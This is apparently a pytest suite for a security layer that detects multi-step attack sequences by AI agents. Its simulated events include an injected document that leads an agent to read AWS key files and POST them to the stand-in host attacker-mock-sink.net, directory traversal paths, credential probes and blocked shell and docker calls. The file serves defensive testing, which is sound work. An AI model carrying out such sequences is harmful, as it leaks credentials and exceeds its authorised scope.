"""
Unit and Integration Tests for Behavioral Sequence Detection Engine.
Validates state-transition tracking across multi-step agent trajectories:
- Confirms benign sequences never trigger false sequence alerts.
- Confirms complete simulated multi-step attack sequences trigger expected detections.
- Validates gateway integration and incident engine correlation.
"""

import pytest
import uuid
from datetime import datetime, timezone, timedelta
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.database import Base
from app.models.agent import AgentModel, PolicyManifestModel
from app.models.event import SecurityEventModel
from app.models.incident import IncidentModel
from app.security.sequence_detector import sequence_detector, BehavioralSequenceDetector
from app.security.gateway import gateway
from app.security.correlation_engine import correlation_engine
from app.security.ml_detector import ml_detector
from app.schemas.event import ToolCallRequest


def _make_dummy_event(
    session_id: str,
    action_type: str = "TOOL_CALL_ALLOWED",
    tool_name: str = "document_reader",
    resource: str = "public/report.txt",
    requested_operation: str = "READ",
    policy_decision: str = "ALLOW",
    execution_status: str = "EXECUTED",
    risk_indicators: list = None,
    source_of_input: str = "DIRECT_AGENT",
    time_offset_secs: int = 0
) -> SecurityEventModel:
    """Helper to synthesize structured SecurityEventModel objects with ordered timestamps."""
    return SecurityEventModel(
        event_id=str(uuid.uuid4()),
        timestamp=datetime.now(timezone.utc) + timedelta(seconds=time_offset_secs),
        agent_id="test_agent_001",
        session_id=session_id,
        task_id="test_task_001",
        action_type=action_type,
        tool_name=tool_name,
        resource=resource,
        requested_operation=requested_operation,
        parameters={"path": resource},
        policy_decision=policy_decision,
        execution_status=execution_status,
        risk_indicators=risk_indicators or [],
        source_of_input=source_of_input
    )


def test_benign_activity_does_not_trigger_sequence():
    """Confirms that purely authorized, benign multi-step workflows do not generate false positive sequence alerts."""
    detector = BehavioralSequenceDetector()
    session_id = f"sess_benign_{uuid.uuid4().hex[:8]}"

    # Step 1: Read public document
    e1 = _make_dummy_event(session_id, tool_name="document_reader", resource="public/doc.txt", requested_operation="READ", time_offset_secs=1)
    # Step 2: Math computation
    e2 = _make_dummy_event(session_id, tool_name="calculator", resource="expr:1+1", requested_operation="CALCULATE", time_offset_secs=2)
    # Step 3: Search catalog
    e3 = _make_dummy_event(session_id, tool_name="browser_search", resource="search_query:docs", requested_operation="SEARCH", time_offset_secs=3)
    # Step 4: Write summary
    e4 = _make_dummy_event(session_id, tool_name="filesystem_write", resource="output/summary.txt", requested_operation="WRITE", policy_decision="REQUIRE_APPROVAL", execution_status="PENDING_APPROVAL", time_offset_secs=4)

    prior = [e1, e2, e3]
    detections = detector.evaluate_sequence(current_event=e4, prior_events=prior)
    assert len(detections) == 0, f"Expected 0 sequence alerts on benign activity, got: {detections}"


def test_attack_sequence_indirect_injection_to_exfiltration():
    """
    Simulates ATTACK_01:
    1. Untrusted indirect prompt injection ingested.
    2. Agent shifts to probing sensitive credential store.
    3. Agent dispatches outbound exfiltration request.
    Confirms SEQ_01_INJECTION_TO_EXFIL is triggered.
    """
    detector = BehavioralSequenceDetector()
    session_id = f"sess_attack1_{uuid.uuid4().hex[:8]}"

    # Event 1: Ingestion of indirect injection payload
    e1 = _make_dummy_event(
        session_id=session_id,
        tool_name="document_reader",
        resource="public/injected_brief.txt",
        requested_operation="READ",
        source_of_input="INDIRECT_INJECTION",
        risk_indicators=["UNTRUSTED_INDIRECT_INPUT"],
        time_offset_secs=1
    )

    # Event 2: Credential probe triggered by injection
    e2 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="filesystem_read",
        resource="credentials/aws_keys.env",
        requested_operation="READ",
        policy_decision="DENY",
        execution_status="BLOCKED",
        risk_indicators=["SENSITIVE_CREDENTIAL_ACCESS", "UNTRUSTED_INDIRECT_INPUT"],
        source_of_input="INDIRECT_INJECTION",
        time_offset_secs=2
    )

    # Event 3: Outbound network exfiltration attempt
    e3 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="mock_api_request",
        resource="https://attacker-mock-sink.net/exfil",
        requested_operation="NETWORK_CALL",
        policy_decision="DENY",
        execution_status="BLOCKED",
        risk_indicators=["DATA_EXFILTRATION_RISK", "UNAPPROVED_DOMAIN", "UNTRUSTED_INDIRECT_INPUT"],
        source_of_input="INDIRECT_INJECTION",
        time_offset_secs=3
    )

    # Evaluate at step 1: No sequence yet
    assert detector.evaluate_sequence(current_event=e1, prior_events=[]) == []

    # Evaluate at step 2: No full 3-step sequence yet
    assert detector.evaluate_sequence(current_event=e2, prior_events=[e1]) == []

    # Evaluate at step 3: Full sequence triggered!
    detections = detector.evaluate_sequence(current_event=e3, prior_events=[e1, e2])
    assert len(detections) >= 1
    pattern_ids = [d["pattern_id"] for d in detections]
    assert "SEQ_01_INJECTION_TO_EXFIL" in pattern_ids

    match = next(d for d in detections if d["pattern_id"] == "SEQ_01_INJECTION_TO_EXFIL")
    assert match["severity"] == "CRITICAL"
    assert match["matched_states"] == ["INDIRECT_INJECTION", "CREDENTIAL_PROBE", "NETWORK_CALL"]
    assert match["window_event_ids"] == [e1.event_id, e2.event_id, e3.event_id]


def test_attack_sequence_recon_to_credential_theft():
    """
    Simulates SEQ_02:
    1. Normal benign read (BENIGN_READ)
    2. Out-of-scope traversal probe (SCOPE_PROBE)
    3. Target credential store (CREDENTIAL_PROBE)
    Confirms SEQ_02_RECON_TO_CREDENTIAL_PROBE is triggered.
    """
    detector = BehavioralSequenceDetector()
    session_id = f"sess_recon_{uuid.uuid4().hex[:8]}"

    e1 = _make_dummy_event(
        session_id=session_id,
        tool_name="document_reader",
        resource="public/system_architecture.md",
        requested_operation="READ",
        policy_decision="ALLOW",
        execution_status="EXECUTED",
        time_offset_secs=1
    )
    e2 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="document_reader",
        resource="../../private/internal_audit.txt",
        requested_operation="READ",
        policy_decision="DENY",
        execution_status="BLOCKED",
        risk_indicators=["DIRECTORY_TRAVERSAL", "SCOPE_VIOLATION"],
        time_offset_secs=2
    )
    e3 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="document_reader",
        resource="credentials/db_passwords.json",
        requested_operation="READ",
        policy_decision="DENY",
        execution_status="BLOCKED",
        risk_indicators=["SENSITIVE_CREDENTIAL_ACCESS"],
        time_offset_secs=3
    )

    detections = detector.evaluate_sequence(current_event=e3, prior_events=[e1, e2])
    pattern_ids = [d["pattern_id"] for d in detections]
    assert "SEQ_02_RECON_TO_CREDENTIAL_PROBE" in pattern_ids


def test_attack_sequence_stealth_multi_vector_probing():
    """
    Simulates SEQ_03:
    1. Search query (SEARCH)
    2. Unauthorized tool attempt 1 (TOOL_VIOLATION)
    3. Unauthorized tool attempt 2 (TOOL_VIOLATION)
    Confirms SEQ_03_STEALTH_PROBING is triggered.
    """
    detector = BehavioralSequenceDetector()
    session_id = f"sess_probe_{uuid.uuid4().hex[:8]}"

    e1 = _make_dummy_event(
        session_id=session_id,
        tool_name="browser_search",
        resource="search_query:internal passwords",
        requested_operation="SEARCH",
        time_offset_secs=1
    )
    e2 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="bash_exec",
        resource="bash_exec",
        requested_operation="EXECUTE",
        policy_decision="DENY",
        execution_status="BLOCKED",
        risk_indicators=["UNAUTHORIZED_TOOL_INVOCATION"],
        time_offset_secs=2
    )
    e3 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="docker_run",
        resource="docker_run",
        requested_operation="EXECUTE",
        policy_decision="DENY",
        execution_status="BLOCKED",
        risk_indicators=["UNAUTHORIZED_TOOL_INVOCATION"],
        time_offset_secs=3
    )

    detections = detector.evaluate_sequence(current_event=e3, prior_events=[e1, e2])
    pattern_ids = [d["pattern_id"] for d in detections]
    assert "SEQ_03_STEALTH_PROBING" in pattern_ids


def test_attack_sequence_repeated_credential_probing_surge():
    """
    Simulates SEQ_04:
    Consecutive credential harvest requests trigger repeated probing surge pattern.
    """
    detector = BehavioralSequenceDetector()
    session_id = f"sess_surge_{uuid.uuid4().hex[:8]}"

    e1 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="document_reader",
        resource="credentials/aws_keys.env",
        policy_decision="DENY",
        risk_indicators=["SENSITIVE_CREDENTIAL_ACCESS"],
        time_offset_secs=1
    )
    e2 = _make_dummy_event(
        session_id=session_id,
        action_type="TOOL_CALL_BLOCKED",
        tool_name="document_reader",
        resource="credentials/db_passwords.json",
        policy_decision="DENY",
        risk_indicators=["SENSITIVE_CREDENTIAL_ACCESS"],
        time_offset_secs=2
    )

    detections = detector.evaluate_sequence(current_event=e2, prior_events=[e1])
    pattern_ids = [d["pattern_id"] for d in detections]
    assert "SEQ_04_REPEATED_CREDENTIAL_PROBE" in pattern_ids


def test_end_to_end_gateway_sequence_integration():
    """
    Integration test connecting the Gateway, PolicyEngine, SequenceDetector,
    and IncidentCorrelationEngine:
    Executes a 3-step live attack through gateway.dispatch_tool_call and verifies that:
    1. Dangerous actions are blocked pre-execution.
    2. An incident is created.
    3. 'sequence_detector' is registered in incident.detection_engines.
    """
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=engine)
    TestingSession = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    db = TestingSession()

    try:
        correlation_engine.set_detectors(sequence_detector=sequence_detector, ml_detector=ml_detector)
        gateway.set_correlation_engine(correlation_engine)

        agent_id = "agent_seq_integ_001"
        session_id = f"sess_integ_{uuid.uuid4().hex[:8]}"

        agent = AgentModel(
            agent_id=agent_id,
            name="Seq Integration Agent",
            role="Document Analyst",
            authorized_objective="Summarize public documents."
        )
        policy = PolicyManifestModel(
            policy_id=str(uuid.uuid4()),
            agent_id=agent_id,
            allowed_tools=["document_reader", "calculator", "browser_search"],
            allowed_paths=["public/*"],
            denied_paths=["credentials/*", "private/*"],
            allowed_network_domains=["api.internal.mock"],
            allowed_operations=["READ", "CALCULATE", "SEARCH"],
            require_approval_operations=["WRITE"],
            max_denial_threshold=5
        )
        db.add(agent)
        db.add(policy)
        db.commit()

        # Step 1: Read injected brief (source: INDIRECT_INJECTION)
        r1 = gateway.dispatch_tool_call(
            db=db,
            request=ToolCallRequest(
                agent_id=agent_id,
                session_id=session_id,
                task_id="task_integ",
                tool_name="document_reader",
                parameters={"path": "public/injected_research_brief.txt"},
                source_of_input="INDIRECT_INJECTION"
            )
        )
        assert r1.policy_decision == "ALLOW"
        assert r1.execution_status == "EXECUTED"

        # Step 2: Probed credentials/aws_keys.env (source: INDIRECT_INJECTION)
        r2 = gateway.dispatch_tool_call(
            db=db,
            request=ToolCallRequest(
                agent_id=agent_id,
                session_id=session_id,
                task_id="task_integ",
                tool_name="document_reader",
                parameters={"path": "credentials/aws_keys.env"},
                source_of_input="INDIRECT_INJECTION"
            )
        )
        assert r2.policy_decision == "DENY"
        assert r2.execution_status == "BLOCKED"

        # Step 3: Outbound network exfil to unauthorized destination
        r3 = gateway.dispatch_tool_call(
            db=db,
            request=ToolCallRequest(
                agent_id=agent_id,
                session_id=session_id,
                task_id="task_integ",
                tool_name="mock_api_request",
                parameters={"method": "POST", "url": "https://attacker-mock-sink.net/exfil", "body": {"leak": "keys"}},
                source_of_input="INDIRECT_INJECTION"
            )
        )
        assert r3.policy_decision == "DENY"
        assert r3.execution_status == "BLOCKED"

        # Verify incident was created and has sequence_detector in detection_engines
        incident = db.query(IncidentModel).filter(IncidentModel.session_id == session_id).first()
        assert incident is not None
        assert "sequence_detector" in incident.detection_engines
        assert incident.primary_threat_category in ["PROMPT_INJECTION", "CREDENTIAL_THEFT", "EXFILTRATION"]

    finally:
        db.close()
